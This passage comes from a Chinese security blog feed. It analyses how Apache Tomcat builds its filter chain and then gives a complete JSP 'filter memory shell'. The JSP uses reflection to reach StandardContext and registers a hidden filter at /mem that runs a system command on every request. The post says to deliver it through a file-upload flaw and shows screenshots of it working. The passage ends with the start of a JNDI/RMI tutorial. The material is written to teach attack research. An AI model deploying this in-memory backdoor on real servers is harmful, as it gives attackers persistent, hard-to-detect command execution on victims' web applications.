filterMap : filterMaps) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!matchDispatcher(filterMap, dispatcher)) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (!matchFiltersServlet(filterMap, servletName)) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig)</span><br><span class="line">                    context.findFilterConfig(filterMap.getFilterName());</span><br><span class="line">            <span class="keyword">if</span> (filterConfig == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">// FIXME - log configuration problem</span></span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            filterChain.addFilter(filterConfig);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Return the completed filter chain</span></span><br><span class="line">        <span class="keyword">return</span> filterChain;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><code>filterMaps[]</code>属性是从context执行<code>findFilterMaps</code>方法后所返回的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> FilterMap[] findFilterMaps() &#123;</span><br><span class="line">    <span class="keyword">return</span> filterMaps.asArray();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740022403092-db28fc42-94a7-4919-9ec1-a405edd7079d.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740022403092-db28fc42-94a7-4919-9ec1-a405edd7079d.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>其中<code>filterChain.addFilter(filterConfig);</code>会将filter加入到filterChain中</p>
<p>要想执行到<code>filterChain.addFilter(filterConfig);</code>，我们需要保证filterMaps与filterConfig不为空</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((filterMaps == <span class="literal">null</span>) || (filterMaps.length == <span class="number">0</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> filterChain;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">for</span> (FilterMap filterMap : filterMaps) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!matchDispatcher(filterMap, dispatcher)) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (!matchFiltersURL(filterMap, requestPath)) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig)</span><br><span class="line">                    context.findFilterConfig(filterMap.getFilterName());</span><br><span class="line">            <span class="keyword">if</span> (filterConfig == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">// FIXME - log configuration problem</span></span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            filterChain.addFilter(filterConfig);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<h3 id="obF3g">小结流程</h3>
<h4 id="Bwlh4">执行invoke方法</h4>
层层调用invoke，对filterChain执行addFilter方法，构造好filterChain

<h4 id="SH7Hi">拿出filterchain</h4>
进行`dofilter`工作，对filterchain中的filter一个一个进行链式调用

<h4 id="WnYOh">最后一个filter</h4>

<p>在最后一个filter执行完<code>doFilter</code>方法后，跳到<code>&lt;font style=&quot;color:rgb(83, 83, 96);background-color:rgb(242, 242, 242);&quot;&gt;Servlet.service()&lt;/font&gt;</code></p>
<h4 id="qrB6I">攻击思路</h4>

<p>我们的攻击代码，应该在<code>StandardContext#findFilterConfig</code>中生效，从filterConfigs获取filter，可以保证我们的每次请求都会触发恶意filter，若在其他位置加入filter，可能只会在本次请求中触发恶意filter</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> FilterConfig <span class="title function_">findFilterConfig</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> filterConfigs.get(name);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><font style="color:rgb(80, 80, 92);">我们只需要构造含有恶意的 filter 的</font><font style="color:rgb(80, 80, 92);"> </font><strong>filterConfig</strong><font style="color:rgb(80, 80, 92);"> </font><font style="color:rgb(80, 80, 92);">和拦截器</font><font style="color:rgb(80, 80, 92);"> </font><strong>filterMaps</strong><font style="color:rgb(80, 80, 92);">，就可以达到触发目的了，并且它们都是从 StandardContext 中来的。</font></p>
<p><font style="color:rgb(80, 80, 92);">而这个 filterMaps 中的数据对应 web.xml 中的 filter-mapping 标签</font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;  </span><br><span class="line">&lt;web-app xmlns=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span>  </span><br><span class="line"> xmlns:xsi=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>  </span><br><span class="line"> xsi:schemaLocation=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span>  </span><br><span class="line"> version=<span class="string">&quot;4.0&quot;</span>&gt;  </span><br><span class="line"> &lt;filter&gt; &lt;filter-name&gt;filter&lt;/filter-name&gt;  </span><br><span class="line"> &lt;filter-class&gt;filter&lt;/filter-class&gt;  </span><br><span class="line"> &lt;/filter&gt;  </span><br><span class="line"> &lt;filter-mapping&gt; &lt;filter-name&gt;filter&lt;/filter-name&gt;  </span><br><span class="line"> &lt;url-pattern&gt;/filter&lt;/url-pattern&gt;  </span><br><span class="line"> &lt;/filter-mapping&gt;&lt;/web-app&gt;</span><br></pre></td></tr></table></figure>

<h3 id="OnoJl">思路分析</h3>

<p><code>StandardContext</code><font style="color:rgb(80, 80, 92);"> 这个类是一个容器类，它负责存储整个 Web 应用程序的数据和对象，并加载了 web.xml 中配置的多个 Servlet、Filter 对象以及它们的映射关系。</font></p>
<p>在该类中，<font style="color:rgb(80, 80, 92);">有以下三个与filter有关的成员变量</font></p>
<blockquote>
<ol>
<li><font style="color:rgb(80, 80, 92);">filterConfigs 成员变量是一个HashMap对象，里面存储了filter名称与对应的</font><code>ApplicationFilterConfig</code><font style="color:rgb(80, 80, 92);">对象的键值对，在</font><code>ApplicationFilterConfig</code><font style="color:rgb(80, 80, 92);">对象中则存储了Filter实例以及该实例在web.xml中的注册信息。</font></li>
<li><font style="color:rgb(80, 80, 92);">filterDefs 成员变量成员变量是一个HashMap对象，存储了filter名称与相应</font><code>FilterDef</code><font style="color:rgb(80, 80, 92);">的对象的键值对，而</font><code>FilterDef</code><font style="color:rgb(80, 80, 92);">对象则存储了Filter包括名称、描述、类名、Filter实例在内等与filter自身相关的数据</font></li>
<li><font style="color:rgb(80, 80, 92);">filterMaps 中的</font><code>FilterMap</code><font style="color:rgb(80, 80, 92);">则记录了不同filter与</font><code>UrlPattern</code><font style="color:rgb(80, 80, 92);">的映射关系</font></li>
</ol>
</blockquote>
<p>我们需要找到一个方法，去修改<code>filterMaps</code>，它对应的是web.xml中的filter-mapping标签，也就是<strong>路径</strong>与<strong>filter-name</strong>的对应关系</p>
<ul>
<li>而我们后面说的<code>&lt;font style=&quot;color:rgb(80, 80, 92);&quot;&gt;filterDef&lt;/font&gt;</code><font style="color:rgb(80, 80, 92);">，对应的就是web.xml中的filter标签，是</font><strong><font style="color:rgb(80, 80, 92);">Filter类</font></strong><font style="color:rgb(80, 80, 92);">与</font><strong><font style="color:rgb(80, 80, 92);">filter-name</font></strong><font style="color:rgb(80, 80, 92);">的对应关系</font></li>
</ul>
<p>在<code>StandardContext</code><font style="color:rgb(80, 80, 92);">类中存在两个方法，可以向</font><code>&lt;font style=&quot;color:rgb(80, 80, 92);&quot;&gt;filterMaps&lt;/font&gt;</code><font style="color:rgb(80, 80, 92);">中添加数据</font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addFilterMap</span><span class="params">(FilterMap filterMap)</span> &#123;</span><br><span class="line">    validateFilterMap(filterMap);</span><br><span class="line">    <span class="comment">// Add this filter mapping to our registered set</span></span><br><span class="line">    filterMaps.add(filterMap);</span><br><span class="line">    fireContainerEvent(<span class="string">&quot;addFilterMap&quot;</span>, filterMap);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addFilterMapBefore</span><span class="params">(FilterMap filterMap)</span> &#123;</span><br><span class="line">    validateFilterMap(filterMap);</span><br><span class="line">    <span class="comment">// Add this filter mapping to our registered set</span></span><br><span class="line">    filterMaps.addBefore(filterMap);</span><br><span class="line">    fireContainerEvent(<span class="string">&quot;addFilterMap&quot;</span>, filterMap);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>修改<code>filterDef</code>，在<code>StandardContext</code><font style="color:rgb(80, 80, 92);">类中存在着方法</font><code>&lt;font style=&quot;color:rgb(80, 80, 92);&quot;&gt;addFilterDef&lt;/font&gt;</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addFilterDef</span><span class="params">(FilterDef filterDef)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">synchronized</span> (filterDefs) &#123;</span><br><span class="line">            filterDefs.put(filterDef.getFilterName(), filterDef);</span><br><span class="line">        &#125;</span><br><span class="line">        fireContainerEvent(<span class="string">&quot;addFilterDef&quot;</span>, filterDef);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>最后的<code>filterConfig</code>，在<code>StandardContext</code><font style="color:rgb(80, 80, 92);">类中存在着方法</font><code>&lt;font style=&quot;color:rgb(80, 80, 92);&quot;&gt;filterStart&lt;/font&gt;</code><font style="color:rgb(80, 80, 92);">，该方法中的</font><code>&lt;font style=&quot;color:rgb(80, 80, 92);&quot;&gt;filterConfigs.put(name, filterConfig);&lt;/font&gt;</code><font style="color:rgb(80, 80, 92);">部分完成了</font><code>&lt;font style=&quot;color:rgb(80, 80, 92);&quot;&gt;filterConfig&lt;/font&gt;</code><font style="color:rgb(80, 80, 92);">的添加。在后续实现过程中，可以调用</font><code>&lt;font style=&quot;color:rgb(80, 80, 92);&quot;&gt;StandardContext#filterStart&lt;/font&gt;</code><font style="color:rgb(80, 80, 92);">方法完成添加，也可以直接调用</font><code>&lt;font style=&quot;color:rgb(80, 80, 92);&quot;&gt;filterConfigs.put(name, filterConfig);&lt;/font&gt;</code><font style="color:rgb(80, 80, 92);">，道理都是一样的</font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">filterStart</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (getLogger().isDebugEnabled()) &#123;</span><br><span class="line">            getLogger().debug(<span class="string">&quot;Starting filters&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Instantiate and record a FilterConfig for each defined filter</span></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">ok</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">synchronized</span> (filterConfigs) &#123;</span><br><span class="line">            filterConfigs.clear();</span><br><span class="line">            <span class="keyword">for</span> (Entry&lt;String,FilterDef&gt; entry : filterDefs.entrySet()) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> entry.getKey();</span><br><span class="line">                <span class="keyword">if</span> (getLogger().isDebugEnabled()) &#123;</span><br><span class="line">                    getLogger().debug(<span class="string">&quot; Starting filter &#x27;&quot;</span> + name + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span></span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">ApplicationFilterConfig</span>(<span class="built_in">this</span>, entry.getValue());</span><br><span class="line">                    filterConfigs.put(name, filterConfig);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Throwable t) &#123;</span><br><span class="line">                    t = ExceptionUtils.unwrapInvocationTargetException(t);</span><br><span class="line">                    ExceptionUtils.handleThrowable(t);</span><br><span class="line">                    getLogger().error(sm.getString(</span><br><span class="line">                            <span class="string">&quot;standardContext.filterStart&quot;</span>, name), t);</span><br><span class="line">                    ok = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ok;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="AFHVe">实现</h2>
servlet内存马相似，依旧是写马+动态注册

<h3 id="l8hXT">构造思路</h3>

<p><font style="color:rgb(80, 80, 92);">通过前文分析，得出构造的主要思路如下<br></font><font style="color:rgb(80, 80, 92);">1、获取当前应用的ServletContext对象<br></font><font style="color:rgb(80, 80, 92);">2、通过ServletContext对象再获取filterConfigs<br></font><font style="color:rgb(80, 80, 92);">2、接着实现自定义想要注入的filter对象<br></font><font style="color:rgb(80, 80, 92);">4、然后为自定义对象的filter创建一个FilterDef<br></font><font style="color:rgb(80, 80, 92);">5、最后把 ServletContext对象、filter对象、FilterDef全部都设置到filterConfigs即可完成内存马的实现</font></p>
<h3 id="RXwTZ">filter内存马的实现</h3>

<blockquote>
<p>这里是实现代码执行，不对内存马的回显进行分析</p>
</blockquote>
<p>实现动态注册，首先需要通过反射来获取<code>StandardContext</code>（和servlet内存马一样）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line"><span class="type">Field</span> <span class="variable">appctx</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">appctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appctx.get(servletContext);</span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">stdctx</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">stdctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) stdctx.get(applicationContext);</span><br></pre></td></tr></table></figure>

<p><font style="color:rgb(80, 80, 92);">由前面</font><strong><font style="color:rgb(80, 80, 92);">Filter实例存储分析</font></strong><font style="color:rgb(80, 80, 92);">得知 </font><code>StandardContext</code><font style="color:rgb(80, 80, 92);"> Filter实例存放在filterConfigs、filterDefs、filterConfigs这三个变量里面，将fifter添加到这三个变量中即可将内存马打入。</font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">filterName</span> <span class="operator">=</span> <span class="string">&quot;cmdFilter&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">FilterDef</span> <span class="variable">def</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">def.setFilterName(filterName);</span><br><span class="line">def.setFilter(shellFilter);</span><br><span class="line">def.setFilterClass(shellFilter.getClass().getName());</span><br><span class="line"></span><br><span class="line"><span class="type">FilterMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">map.setFilterName(filterName);</span><br><span class="line">map.addURLPattern(<span class="string">&quot;/mem&quot;</span>);</span><br><span class="line"></span><br><span class="line">standardContext.addFilterDef(def);</span><br><span class="line">standardContext.addFilterMapBefore(map);</span><br><span class="line">standardContext.filterStart();</span><br><span class="line"></span><br><span class="line">out.println(<span class="string">&quot;success&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>将上述代码整理好后，写入网站上的一个jsp文件中（利用方式：文件上传）</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">&lt;%--</span><br><span class="line">  <span class="title class_">Created</span> by <span class="title class_">IntelliJ</span> <span class="variable constant_">IDEA</span>.</span><br><span class="line">  <span class="title class_">User</span>: <span class="title class_">Andu1</span>n</span><br><span class="line">  <span class="title class_">Date</span>: <span class="number">2025</span>/<span class="number">2</span>/<span class="number">19</span></span><br><span class="line">  <span class="title class_">Time</span>: <span class="number">19</span>:<span class="number">33</span></span><br><span class="line">  <span class="title class_">To</span> change <span class="variable language_">this</span> template use <span class="title class_">File</span> | <span class="title class_">Settings</span> | <span class="title class_">File</span> <span class="title class_">Templates</span>.</span><br><span class="line">--%&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Map&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Context&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.security.auth.login.ConfigurationSpi&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.ObjectInputFilter&quot;</span> %&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">&lt;%</span></span><br><span class="line"><span class="language-xml">  ServletContext servletContext = request.getSession().getServletContext();</span></span><br><span class="line"><span class="language-xml">  Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);</span></span><br><span class="line"><span class="language-xml">  appctx.setAccessible(true);</span></span><br><span class="line"><span class="language-xml">  ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">  Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);</span></span><br><span class="line"><span class="language-xml">  stdctx.setAccessible(true);</span></span><br><span class="line"><span class="language-xml">  StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">  Filter shellFilter = new Filter() &#123;</span></span><br><span class="line"><span class="language-xml">    @Override</span></span><br><span class="line"><span class="language-xml">    public void init(FilterConfig filterConfig) throws ServletException &#123;</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    &#125;</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    @Override</span></span><br><span class="line"><span class="language-xml">    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123;</span></span><br><span class="line"><span class="language-xml">      Runtime.getRuntime().exec(&quot;calc&quot;);</span></span><br><span class="line"><span class="language-xml">    &#125;</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    @Override</span></span><br><span class="line"><span class="language-xml">    public void destroy() &#123;</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    &#125;</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">  &#125;;</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">  String filterName = &quot;cmdFilter&quot;;</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">  FilterDef def = new FilterDef();</span></span><br><span class="line"><span class="language-xml">  def.setFilterName(filterName);</span></span><br><span class="line"><span class="language-xml">  def.setFilter(shellFilter);</span></span><br><span class="line"><span class="language-xml">  def.setFilterClass(shellFilter.getClass().getName());</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">  FilterMap map = new FilterMap();</span></span><br><span class="line"><span class="language-xml">  map.setFilterName(filterName);</span></span><br><span class="line"><span class="language-xml">  map.addURLPattern(&quot;/mem&quot;);</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">  standardContext.addFilterDef(def);</span></span><br><span class="line"><span class="language-xml">  standardContext.addFilterMapBefore(map);</span></span><br><span class="line"><span class="language-xml">  standardContext.filterStart();</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">  out.println(&quot;success&quot;);</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">%&gt;</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>启动tomcat服务，访问addFilter.jsp，执行我们的jsp代码</p>
<p>回显success，说明我们前面的代码都已经执行成功，完成了内存马的注入</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740024176570-94403153-3034-4c3f-9c3e-fe9b5dbb800c.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740024176570-94403153-3034-4c3f-9c3e-fe9b5dbb800c.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>后续访问我们设定好的内存马路径，成功执行代码</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740024260413-8f70c49f-e9ef-4c05-96bd-98bebce1d826.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740024260413-8f70c49f-e9ef-4c05-96bd-98bebce1d826.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>memShell</tag>
      </tags>
  </entry>
  <entry>
    <title>JNDI专题</title>
    <url>/2025/03/08/JNDI%E4%B8%93%E9%A2%98/</url>
    <content><![CDATA[<h1 id="f9scM">JNDI专题</h1>
<h2 id="LdYqz">简介</h2>
<h3 id="XvDGy">JNDI是什么</h3>

<p>**JNDI(Java Naming and Directory Interface,Java命名和目录接口)**是SUN公司提供的一种标准的Java命名系统接口，JNDI提供统一的客户端API，通过不同的访问提供者接口JNDI服务供应接口(SPI)的实现，由管理者将JNDI API映射为特定的命名服务和目录系统，使得Java应用程序可以和这些命名服务和目录服务之间进行交互。</p>
<p>简单来说就是一个索引库，将一个名称对应到一个对象（或者属性）上面，并且可以通过指定名称找到相应对象</p>
<p><strong>作用：可以实现动态加载数据库配置文件，从而保持数据库代码不变动等</strong></p>
<h3 id="hMIZu">结构</h3>

<p>JDNI包含在JavaSE平台中。要使用JNDI，必须拥有JNDI类和一个或者多个服务器提供者。JDK包括以下命名&#x2F;目录服务的提供者：</p>
<ul>
<li>轻量级目录访问协议（LDAP）</li>
<li>通过对象请求代理架构（CORBA）通过对象服务（COS）名称服务</li>
<li>Java远程方法调用（RMI）注册表</li>
<li>域名服务（DNS）</li>
</ul>
<p>在JavaJDK中提供了5个包，有以下几个</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javax.naming：主要用于命名操作，它包含了命名服务的类和接口，该包定义了Context接口和InitialContext类；</span><br><span class="line"></span><br><span class="line">javax.naming.directory：主要用于目录操作，它定义了DirContext接口和InitialDir- Context类；</span><br><span class="line"></span><br><span class="line">javax.naming.event：在命名目录服务器中请求事件通知；</span><br><span class="line"></span><br><span class="line">javax.naming.ldap：提供LDAP支持；</span><br><span class="line"></span><br><span class="line">javax.naming.spi：允许动态插入不同实现，为不同命名目录服务供应商的开发人员提供开发和实现的途径，以便应用程序通过JNDI可以访问相关服务。</span><br></pre></td></tr></table></figure>

<h2 id="Xddo5">JNDI简单利用</h2>
实现JDNI，我们首先也要把RMIServer启动起来

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">IRemoteObj</span> <span class="variable">remoteObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjlmpl</span>();</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">r</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        r.bind(<span class="string">&quot;remoteObj&quot;</span>,remoteObj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>后续将JNDIRMIServer也启动起来</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIRMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        initialContext.rebind(<span class="string">&quot;rmi://127.0.0.1:1099/remoteObj&quot;</span>,<span class="keyword">new</span> <span class="title class_">RemoteObjlmpl</span>());</span><br><span class="line"><span class="comment">//        Reference refObj = new Reference(&quot;TestRef&quot;,&quot;TestRef&quot;,&quot;http://localhost:7777/&quot;);</span></span><br><span class="line"><span class="comment">//        initialContext.rebind(&quot;rmi://localhost:1099/remoteObj&quot;,refObj);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后通过客户端的远程调用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIRMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        <span class="type">IRemoteObj</span> <span class="variable">remoteObj</span> <span class="operator">=</span> (IRemoteObj) initialContext.lookup(<span class="string">&quot;rmi://127.0.0.1:1099/remoteObj&quot;</span>);</span><br><span class="line">        System.out.println(remoteObj.sayHello(<span class="string">&quot;hello&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="gQnyu">分析</h3>
我们不能像RMI之前那样来调用了，但调用的方式其实差不多

<p>首先要做的是创建一个<strong>初始化上下文</strong></p>
<p>然后再去寻找，我们需要把协议地址传入</p>
